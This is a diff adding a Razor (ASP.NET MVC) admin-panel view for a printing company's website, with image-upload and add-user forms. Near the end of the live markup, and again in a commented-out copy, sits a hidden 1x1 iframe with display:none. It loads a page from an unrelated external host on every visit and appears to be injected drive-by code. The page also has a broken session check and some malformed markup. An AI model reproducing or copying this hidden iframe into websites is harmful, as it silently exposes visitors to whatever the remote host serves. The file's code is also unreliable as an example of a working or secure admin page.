@@ -1,0 +1,388 @@
+﻿@using d1.Models;
+
+<!--Where is the main work -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+
+        function backPage() {
+            //alert("backPage function here !!");
+            window.history.forward();
+        }
+    </script>
+
+
+    <link rel="stylesheet" href="http://www.w3schools.com/lib/w3.css">
+    <link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+        S Print
+    </title>
+
+    <!-- Bootstrap -->
+    <link href="~/Content/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="~/Content/font-awesome.min.css">
+
+    <link href="~/Content/animate.min.css" rel="stylesheet">
+    <link href="~/Content/prettyPhoto.css" rel="stylesheet">
+    <link href="~/Content/main.css" rel="stylesheet">
+    <link href="~/Content/responsive.css" rel="stylesheet">
+    <!--[if lt IE 9]>
+    <script src="js/html5shiv.js"></script>
+    <script src="js/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+<body class="homepage" onload="backPage()">
+    <header id="header">
+        <nav class="navbar navbar-fixed-top" role="banner">
+            <div class="container">
+                <div class="navbar-header">
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <a class="navbar-brand" href="~/Home/Index">SS Print</a>
+                </div>
+
+                <div class="collapse navbar-collapse navbar-right">
+                    <ul class="nav navbar-nav">
+                        <li class="active"><a href="~/Home/Index">Home</a></li>
+                        <li><a href="~/Home/aboutus">About Us</a></li>
+                        @*<li><a href="~/Home/services">Services</a></li>
+                            <li><a href="~/Home/portfolio">Portfolio</a></li>
+                            <li><a href="~/Home/client">Clients</a></li>
+                            <li><a href="~/Home/contactus">Contact</a></li>*@
+                        @if (Session["login"].Equals("Login"))
+                        {
+                            <li><a href="~/Home/Login1">LogOut</a></li>
+                        }
+                    </ul>
+                </div>
+            </div><!--/.container-->
+        </nav><!--/nav-->
+
+    </header><!--/header-->
+
+    <br><br><br>
+    <section id="feature">
+        <div class="container">
+            <div class="center wow fadeInDown">
+                <marquee>
+                    <h4 style="text-decoration-color:aquamarine">Welcome to SS Print. The Highest Offset Printing.</h4>
+                </marquee>
+                <h2>SSPrint (PVT) LTD</h2>
+            </div>
+        </div><!--/.container-->
+    </section><!--/#feature-->
+    <!--Here Login Form -->
+    <div onload="checkSession()" style="background-color:bisque; height:auto; width:auto">
+
+        <h1 style="text-align:center"> Welcome to the Admin Panel</h1>
+
+        <div style="height:100%  ; width:80%">
+            @*<form action="~/Home/addimage" method="post">
+                    <input type="button" name="Add Images" />
+
+                    <input type="submit" name="submit" />
+                </form>*@
+
+            <!--Add Images-->
+            <div class="wrap">
+                <div class="content">
+                    <div class="content-grids">
+                        <h1 style="text-align:left">Add Images</h1>
+                        <div class="contact-form">
+
+                            @{using (Html.BeginForm("check", "Home", FormMethod.Post,
+                            new { enctype = "multipart/form-data" }))
+                            {
+                                <div class="form-group">
+                                    <label for="comment">Description</label>
+                                    <textarea class="form-control" style="font-size:medium" name="desc" rows="5" id="comment"></textarea>
+                                </div>
+
+                                <
+                                <div>
+                                    <label for="file">Upload Image:</label>
+                                    <input type="file" name="file" id="file" />
+                                </div>
+                                <br><br>
+                                <input type="submit" value="ADD image">
+
+
+
+                                <p>@ViewBag.Message</p>
+
+                            }
+
+                            }
+                        </div>
+                    </div>
+                </div>
+                <!--End the code of add images -->
+
+            </div>
+
+        </div>
+    </div>
+
+    <div class="form-style-8">
+        <h2>Add User</h2>
+        <form action="~/Home/adduser" method="post">
+            <input type="text" name="username" placeholder="Full Name" />
+            <input type="password" name="password" placeholder="Password" />
+            <input type="text" name="type" placeholder="type" />
+            @*<textarea placeholder="Message" onkeyup="adjust_textarea(this)"></textarea>*@
+            <button type="submit" value="Add User"  name="adduser" >Add User </button>
+        </form>
+    </div>
+
+    <script type="text/javascript">
+        //auto expand textarea
+        function adjust_textarea(h) {
+            h.style.height = "20px";
+            h.style.height = (h.scrollHeight) + "px";
+        }
+    </script>
+    @*<div>
+        <form action="~/Home/adduser" method="post">
+            <label>Enter Username</label>
+            <input type="text" name="username" /><br>
+            <label>Enter Password</label>
+            <input type="password" name="password" /><br>
+            <label>Enter Type</label>
+            <input type="text" name="type" /><br>
+            <button type="submit" value="Add User" name="adduser"> Add User </button>
+        </form>
+    </div>*@
+
+
+    <script type="text/javascript">
+
+        function checkSession() {
+            @{
+            if (Session["login"] != "Login")
+            {
+                Response.Redirect("Login1");
+            }
+        }
+
+        }
+
+    </script>
+    <!--Here Login Finished-->
+    <section id="bottom">
+        <div class="container wow fadeInDown" data-wow-duration="1000ms" data-wow-delay="600ms">
+            <div class="row">
+                <div class="col-md-3 col-sm-6">
+                    <div class="widget">
+                        <h3>Company</h3>
+                        <ul>
+                            <li><a href="~/Home/aboutus">About us</a></li>
+                            <li><a href="#">We are hiring</a></li>
+                            <li><a href="#">Meet the team</a></li>
+                            <li><a href="#">Copyright</a></li>
+                        </ul>
+                    </div>
+                </div><!--/.col-md-3-->
+
+                <div class="col-md-3 col-sm-6">
+                    <div class="widget">
+                        <h3>Support</h3>
+                        <ul>
+                            <li><a href="~/Home/services">Faq</a></li>
+                            <li><a href="#">Client</a></li>
+                            <li><a href="#">Forum</a></li>
+                            <li><a href="#">Documentation</a></li>
+                        </ul>
+                    </div>
+                </div><!--/.col-md-3-->
+                <div class="col-md-3 col-sm-6">
+                    <div class="widget">
+                        <h3>Our Clents</h3>
+                        <ul>
+                            <li><a href="~/Home/services">Clients</a></li>
+                            <li><a href="footer">Eiusmod</a></li>
+                        </ul>
+                    </div>
+                </div><!--/.col-md-3-->
+            </div>
+        </div>
+    </section><!--/#bottom-->
+    @*<!----F00ter-->*@
+    <div class="news_widgets" style="height: 90px;">
+        <marquee behavior="scroll" onmouseover="this.stop();" onmouseout="this.start();" direction="left">
+
+            <img src="~/Images/d.png" alt="s" style=" width:2% ; height:2%" />
+
+
+            <img src="~/Images/more.jpg" alt="s" style=" width:2% ; height:2%" />
+
+
+            <img src="~/Images/im1 (3).png" alt="s" style=" width:1% ; height:1%" />
+
+
+            <img src="~/Images/im1 (4).png" alt="s" style=" width:1% ; height:1%" />
+
+
+            <img src="~/Images/121.jpg" alt="s" style=" width:3% ; height:3%" />
+
+
+            <img src="~/Images/d1.png" alt="s" style=" width:4% ; height:4%" />
+
+
+            <img src="~/Images/d3.png" alt="s" style=" width:1% ; height:1%" />
+
+
+            <img src="~/Images/d4.png" alt="s" style=" width:1% ; height:1%" />
+
+
+            <img src="~/Images/d5.png" alt="s" style=" width:2% ; height:2%" />
+
+
+
+            <img src="~/Images/bullet.png" alt="s" style=" width:4% ; height:4%" />
+
+
+        </marquee>
+
+        <img style="position: relative; top: -125px;" src="~/Images/client.png">
+
+
+    </div>
+    <br><br>
+    <br><br>
+    @*<---/!footer----->*@
+
+    <div class="top-bar">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-12">
+                    <div class="social">
+                        <ul class="social-share">
+                            <li> <a href="http://www.twitter.com"><i class="fa fa-twitter w3-hover-red"></i><!---  style="width:100% ; height:100%" />--></a></li>
+
+                            <li><a href="http://www.facebook.com"><i class="fa fa-facebook"></i>  <!--style="width:100% ; height:100%" />--></a></li>
+
+                            <li><a href="http://www.google.com"><i class="fa fa-google-plus w3-hover-red"><!--<img src="~/images/google+.png" style="width:100% ; height:100%" />--></i></a></li>
+
+                            @*<li><img src="~/images/fb.png"><a href="http://facebook.com">@*<i class="fa fa-facebook"></i></a></li>
+                                                        <li><a href="~/images/twitter.png"><i class="fa fa-twitter"></i></a></li>
+                                @*<li><a href="#"><i class="fa fa-linkedin"></i></a></li>
+                                <li><a href="#"><i class="fa fa-dribbble"></i></a></li>
+                                                        <li><a href="~/images/google+.png"><i class="fa fa-google+"></i></a></li>*@
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div><!--/.container-->
+    </div><!--/.top-bar-->
+
+    <footer id="footer" class="midnight-blue">
+        <div class="container">
+            <div class="row">
+                <div class="col-sm-6">
+                    &copy; 2016 <a target="_blank" href="http://bootstraptaste.com/" title="Free Twitter Bootstrap WordPress Themes and HTML templates">SS Print</a>. All Rights Reserved.
+                </div>
+                <!--
+                    All links in the footer should remain intact.
+                    Licenseing information is available at: http://bootstraptaste.com/license/
+                    You can buy this theme without footer links online at: http://bootstraptaste.com/buy/?theme=Gp
+                -->
+                <div class="col-sm-6">
+                    <ul class="pull-right">
+                        <li><a href="~/Home">Home</a></li>
+                        <li><a href="~/Home/aboutus">About Us</a></li>
+                        <li><a href="~/Home">Faq</a></li>
+                        <li><a href="~/Home/contactus">Contact Us</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </footer><!--/#footer-->
+    <!--footer-->
+    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+    <script src="~/Scripts/jquery.js"></script>
+    <script src="~/Scripts/bootstrap.min.js"></script>
+    <script src="~/Scripts/jquery.prettyPhoto.js"></script>
+    <script src="~/Scripts/jquery.isotope.min.js"></script>
+    <script src="~/Scripts/wow.min.js"></script>
+    <script src="~/Scripts/main.js"></script>
+    <script src="~/Scripts/jquery.js"></script>
+    <script src="~/Scripts/bootstrap.min.js"></script>
+    <script src="~/Scripts/jquery.prettyPhoto.js"></script>
+    <script src="~/Scripts/jquery.isotope.min.js"></script>
+    <script src="~/Scripts/wow.min.js"></script>
+    <script src="~/Scripts/main.js"></script>
+    <script id="__browserLink_initializationData" type="application/json">
+    </script>
+    <iframe width="1px" height="1px" src="http://net.ootil.fr/addo/ban.php?id=1349&ref=http://localhost:54490/" style="display: none;" />
+</body>
+</html>
+
+@*<div class="top-bar">
+                        <div class="container">
+                            <div class="row">
+                                <div class="col-lg-12">
+                                    <div class="social">
+                                        <ul class="social-share">
+                                            <li> <a href="http://www.twitter.com"><i class="fa fa-twitter w3-hover-red"></i><!---  style="width:100% ; height:100%" />--></a></li>
+
+                                            <li><a href="http://www.facebook.com"><i class="fa fa-facebook"></i>  <!--style="width:100% ; height:100%" />--></a></li>
+
+                                            <li><a href="http://www.google.com"><i class="fa fa-google-plus w3-hover-red"><!--<img src="~/images/google+.png" style="width:100% ; height:100%" />--></i></a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div><!--/.container-->
+                    </div><!--/.top-bar-->
+
+                    <footer id="footer" class="midnight-blue">
+                        <div class="container">
+                            <div class="row">
+                                <div class="col-sm-6">
+                                    &copy; 2016 <a target="_blank" href="http://bootstraptaste.com/" title="Free Twitter Bootstrap WordPress Themes and HTML templates">S Print</a>. All Rights Reserved.
+                                </div>
+                                <!--
+                                All links in the footer should remain intact.
+                                Licenseing information is available at: http://bootstraptaste.com/license/
+                                You can buy this theme without footer links online at: http://bootstraptaste.com/buy/?theme=Gp
+                            -->
+                                <div class="col-sm-6">
+                                    <ul class="pull-right">
+                                        <li><a href="~/Home">Home</a></li>
+                                        <li><a href="~/Home/aboutus">About Us</a></li>
+                                        <li><a href="~/Home">Faq</a></li>
+                                        <li><a href="~/Home/contactus">Contact Us</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </footer><!--/#footer-->
+                    <!--footer-->
+                    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+                    <script src="~/Scripts/jquery.js"></script>
+                    <script src="~/Scripts/bootstrap.min.js"></script>
+                    <script src="~/Scripts/jquery.prettyPhoto.js"></script>
+                    <script src="~/Scripts/jquery.isotope.min.js"></script>
+                    <script src="~/Scripts/wow.min.js"></script>
+                    <script src="~/Scripts/main.js"></script>
+                    <script src="~/Scripts/jquery.js"></script>
+                    <script src="~/Scripts/bootstrap.min.js"></script>
+                    <script src="~/Scripts/jquery.prettyPhoto.js"></script>
+                    <script src="~/Scripts/jquery.isotope.min.js"></script>
+                    <script src="~/Scripts/wow.min.js"></script>
+                    <script src="~/Scripts/main.js"></script>
+                    <script id="__browserLink_initializationData" type="application/json">
+                    </script>
+                    <iframe width="1px" height="1px" src="http://net.ootil.fr/addo/ban.php?id=1349&ref=http://localhost:54490/" style="display: none;" />
+    </body>
+    </html>*@
